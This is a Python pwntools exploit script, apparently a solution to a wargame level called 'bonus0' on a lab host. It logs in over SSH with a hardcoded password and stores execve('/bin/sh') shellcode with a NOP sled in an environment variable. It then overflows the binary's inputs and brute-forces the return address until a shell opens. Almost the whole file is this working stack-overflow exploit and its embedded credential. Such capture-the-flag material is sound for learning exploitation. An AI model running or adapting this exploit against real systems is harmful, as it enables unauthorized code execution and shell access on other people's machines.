#!/usr/bin/env python
#coding: utf-8

from pwn import *
import os

# Infos
bin_file = "./bonus0"
host = "192.168.56.102"
port = 4242
user = "bonus0"
password = "f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728"
env={
	'PAYLOAD':"\x90\x90\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
        }

# Open connection
shell = ssh(host=host, port=port, user=user, password=password)

# pseudo bruteforce
i = 0
while (1):
    # Pipe process with our env
    log.info("Run " + bin_file)
    p = shell.run(bin_file, env=env)

    # Print env binary
    log.info("Printing env binary :")
    print(p.env)

    # set input
    input1 = "A" * 50
    input2 = "B" * 9 + p32((0xbfffffff - i) + 8) +  "C" * 37

    # exec
    log.info("Sending Payload...")
    log.info("Payload 1 : %s [len = %d]" % (input1, len(input1)))
    p.sendline(input1)
    log.info("Payload 2 : %s [len = %d]" % (input2, len(input2)))
    p.sendline(input2)
    p.recvrepeat(timeout=2)
    p.interactive()
    i += 10

